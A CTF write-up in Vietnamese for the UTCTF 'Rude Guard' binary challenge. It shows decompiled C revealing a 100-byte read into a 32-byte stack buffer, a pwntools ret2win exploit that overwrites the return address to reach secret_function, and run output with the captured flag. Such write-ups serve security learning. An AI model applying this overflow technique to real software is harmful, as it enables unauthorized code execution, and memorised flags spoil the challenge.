---
title: "UTCTF - Rude Guard - Binary exploitation"
date: 2024-01-11 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, ret2win, stack-overflow, utctf]
author: datious
---
# UTCTF - Rude Guard - Binary exploitation
Author: D1n0_09
1. Sơ lược về chương trình
- Main
```
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  
  if (param_1 == 1) {
    puts("Are you not going to say hello?");
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    if (iVar1 == 1701604463) {
      puts("Hi. What do you want.");
      read_input(0);
    }
    else {
      puts("Hi. Go away.");
    }
  }
  return 0;
}

```
- Read_input:
```
undefined8 read_input(int param_1)

{
  int iVar1;
  char local_28 [32];
  
  read(param_1,local_28,100);
  iVar1 = strcmp(local_28,"givemeflag\n");
  if (iVar1 == 0) {
    puts("How rude! utflag{you\'re going to need a sneakier way in...}");
  }
  else {
    puts("I won\'t let you pass. No matter what.");
  }
  return 0;
}
```


- Tại hàm read trong hàm read_input ta có thể thấy chương trình cho phép nhập vào tận 100 kí tự vào biến local_28 trong khi đó biến local_28 chỉ có độ lớn 32 kí tự => Buffer overflow 
2. Khai thác
- Ta có hàm secret_function ( chính là hàm in ra flag): ta sẽ overwrite save rip để điều khiển chương trình nhảy vô đây để in flag.
- Solve.py 
```#!/usr/bin/python3
from pwn import *
exe=ELF('./pwnable',checksec=False)
p=process([exe.path,'1701604463'])
gdb.attach(p,gdbscript='''
b*0x000000000040120e
c
 
''')
payload=b'A'*40    
payload+=p64(exe.sym['secret_function'])
payload+=p64(0x00000000004011e1)
p.send(payload)  

p.interactive()

```

- Get flag: 
    
    `(pwnenv)─(kali㉿kali)-[~/Downloads/utctf]
└─$ python3 solve.py
[+] Starting local process '/home/kali/Downloads/utctf/pwnable': pid 3652
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/kali/Downloads/utctf/pwnable', '-p', '3652', '-x', '/tmp/pwnlib-gdbscript-etnqvi8h.gdb']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
Hi. What do you want.
I won't let you pass. No matter what.
utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}I won't let you pass. No matter what.
[*] Got EOF while reading in interactive
$  
`